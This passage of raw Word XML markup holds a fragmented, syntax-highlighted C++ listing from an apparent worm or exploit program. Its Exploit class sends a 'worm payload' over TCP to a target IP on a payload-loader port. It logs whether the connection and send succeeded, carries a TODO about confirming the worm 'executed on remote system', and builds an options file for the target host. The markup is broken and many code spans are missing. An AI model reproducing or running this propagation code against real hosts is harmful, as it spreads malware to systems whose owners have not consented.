          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="009900"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>PAYLOAD_LOADER_PORT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wormPayload_bytes</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wormPayload_bytes_length</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 89                 logger-&gt;log(</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>"ERROR:  Failed to send worm payload to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targetIP</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Exploit::</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="009900"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>PAYLOAD_LOADER_PORT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90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91         }</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 92         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 93         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>//TODO consider extra connection check to ensure worm actually executed on remote system</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 94         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 95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true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 96 }</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 97 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 98 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 99 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000E6"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>bool</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> Exploit::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>sendToTarget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ipAddress</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port,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bytes,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bytes_length</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100         </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>TCPClient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tcpClient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ipAddress</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>, port);</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">101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tcpClient.getLastError</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>().empty()) {</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t>102                 logger-&gt;log(</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>"ERROR:  Unable to resolve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ipAddress</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port);</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">103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104         }</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">105         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t>106         logger-&gt;log(</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>"Using timeout value of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TCPClient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9900"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>TIMEOUT_SECONDS</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seconds"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107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tcpClient.connect</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108                 logger-&gt;log(</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>"ERROR:  Unable to connect to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ipAddress</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 port);</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t>109                 logger-&gt;log(</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>"Reason: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tcpClient.getLastError</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110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111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112                 logger-&gt;log(</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>"Connection channel (TCP) established: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tcpClient.getConnectionDetails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113         }</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">114 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">115 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">116         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// Send the requested data</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t>117         logger-&gt;log(</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>"Attempting to send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bytes_length</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bytes"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118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tcpClient.send</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">(bytes, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>bytes_length</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119                 logger-&gt;log(</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>"ERROR:  Failed to send "</w:t>
      </w:r>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sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>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bytes_length</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bytes"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120                 logger-&gt;log(</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>"Reason: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tcpClient.getLastError</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121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false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122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123                 logger-&gt;log(</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>"Sent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bytes_length</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bytes"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124         }</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">125 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">126         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">127         </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>tcpClient.close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128         logger-&gt;log(</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>"Closed connection"</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129         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">130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true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131 }</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">132 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">133 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t>134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&gt; Exploit::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>createOptionsFileContent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targetIPAddress</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port,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135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optionsContent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136 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">137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138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'A'</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139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'V'</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140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141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142 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">143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2E92C7"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>const_iterator</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> it = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>optionsFilename.begin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">(); it &lt; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>optionsFilename.end</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>(); it++ ) {</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">144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*it);</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t>145         }</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">146 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">147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\0</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not strictly required but nice to do</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">148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149 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">150         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>/* Build the actual content so we can grab the length later */</w:t>
